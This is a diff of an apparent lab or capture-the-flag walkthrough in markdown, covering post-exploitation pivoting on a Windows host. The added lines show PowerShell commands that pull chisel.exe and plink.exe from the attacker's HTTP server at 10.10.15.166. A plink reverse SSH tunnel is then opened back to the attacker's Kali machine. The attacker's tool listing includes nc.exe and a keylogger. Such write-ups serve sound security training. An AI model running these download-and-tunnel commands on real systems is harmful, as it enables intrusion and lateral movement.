@@ -737,34 +737,77 @@ SHELL>
 
 ```
 
+
 ``` bash
 
-❯ wget https://github.com/jpillora/chisel/releases/download/v1.11.8/chisel_1.11.8_linux_amd64.gz
+SHELL> (New-Object Net.WebClient).DownloadFile('http://10.10.15.166:9090/chisel', 'C:\Users\anderson.w\Desktop\chisel.exe')
+SHELL> cd C:\Users\anderson.w\Desktop\
+SHELL> pwd
 
---2026-08-25 13:13:09--  https://github.com/jpillora/chisel/releases/download/v1.11.8/chisel_1.11.8_linux_amd64.gz
-Resolving github.com (github.com)... 140.82.121.3
-Connecting to github.com (github.com)|140.82.121.3|:443... connected.
-HTTP request sent, awaiting response... 302 Found
-Location: https://release-assets.githubusercontent.com/github-production-release-asset/31311037/5adebd91-08b6-49b1-a7b2-f71d1b43d8d2?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-08-25T05%3A19%3A36Z&rscd=attachment%3B+filename%3Dchisel_1.11.8_linux_amd64.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-08-25T04%3A18%3A56Z&ske=2026-08-25T05%3A19%3A36Z&sks=b&skv=2018-11-09&sig=AsPSOqMmanu%2BNPI1lRqxrUttY6D4aJSxRMTMa134K4I%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc4NzYzMjQ5MywibmJmIjoxNzg3NjMyMTkzLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.LZutWGAYCWVl6U0RtaqJHuRDtGVBkYf3T5DOK6Aeqx0&response-content-disposition=attachment%3B%20filename%3Dchisel_1.11.8_linux_amd64.gz&response-content-type=application%2Foctet-stream [following]
---2026-08-25 13:13:10--  https://release-assets.githubusercontent.com/github-production-release-asset/31311037/5adebd91-08b6-49b1-a7b2-f71d1b43d8d2?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-08-25T05%3A19%3A36Z&rscd=attachment%3B+filename%3Dchisel_1.11.8_linux_amd64.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-08-25T04%3A18%3A56Z&ske=2026-08-25T05%3A19%3A36Z&sks=b&skv=2018-11-09&sig=AsPSOqMmanu%2BNPI1lRqxrUttY6D4aJSxRMTMa134K4I%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc4NzYzMjQ5MywibmJmIjoxNzg3NjMyMTkzLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.LZutWGAYCWVl6U0RtaqJHuRDtGVBkYf3T5DOK6Aeqx0&response-content-disposition=attachment%3B%20filename%3Dchisel_1.11.8_linux_amd64.gz&response-content-type=application%2Foctet-stream
-Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
-Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.110.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 4318396 (4.1M) [application/octet-stream]
-Saving to: ‘chisel_1.11.8_linux_amd64.gz’
+Path
+----
+C:\Users\anderson.w\Desktop
 
-chisel_1.11.8_linux_amd64.gz  100%[=================================================>]   4.12M  7.89MB/s    in 0.5s
 
-2026-08-25 13:13:11 (7.89 MB/s) - ‘chisel_1.11.8_linux_amd64.gz’ saved [4318396/4318396]
+SHELL> dir
 
-❯ gunzip chisel_1.11.8_linux_amd64.gz
 
-❯ chmod +x chisel_1.11.8_linux_amd64
+    Directory: C:\Users\anderson.w\Desktop
 
-❯ mv chisel_1.11.8_linux_amd64 chisel
-❯ ./chisel server -p 8888 --reverse
-2026/08/25 13:13:34 server: Reverse tunnelling enabled
-2026/08/25 13:13:34 server: Fingerprint P928O5xzNnAXTp6KzovLTV1cHHz25ItUDavg8biOZds=
-2026/08/25 13:13:34 server: Listening on http://0.0.0.0:8888
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         8/25/2026   4:34 AM       10571938 chisel.exe
+
+
+```
+
+``` bash
+
+❯ cd /usr/share/windows-binaries
+❯ ls
+enumplus     fgdump  klogger.exe  nbtenum  plink.exe   vncviewer.exe  whoami.exe
+exe2bat.exe  fport   mbenum       nc.exe   radmin.exe  wget.exe
+❯ python3 -m http.server 9090
+
+Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
+10.129.80.127 - - [25/Aug/2026 13:26:04] "GET /plink.exe HTTP/1.1" 200 -
+10.129.80.127 - - [25/Aug/2026 13:26:30] "GET /plink.exe HTTP/1.1" 200 -
+
+
+```
+
+
+``` bash
+
+SHELL> Invoke-WebRequest -Uri 'http://10.10.15.166:9090/plink.exe' -OutFile 'C:\Users\anderson.w\Desktop\plink.exe'
+SHELL> cd C:\Users\anderson.w\Desktop\
+SHELL> pwd
+
+Path
+----
+C:\Users\anderson.w\Desktop
+
+
+SHELL> dir
+
+
+    Directory: C:\Users\anderson.w\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         8/25/2026   4:34 AM       10571938 chisel.exe
+-a----         8/25/2026   4:44 AM         837936 plink.exe
+
+
+SHELL>
+
+```
+
+``` bash
+
+SHELL> ./plink.exe -ssh -R 17017:127.0.0.1:17017 kali@10.10.15.166 -pw <password> -batch -no-antispoof
+SHELL>
 
 ```
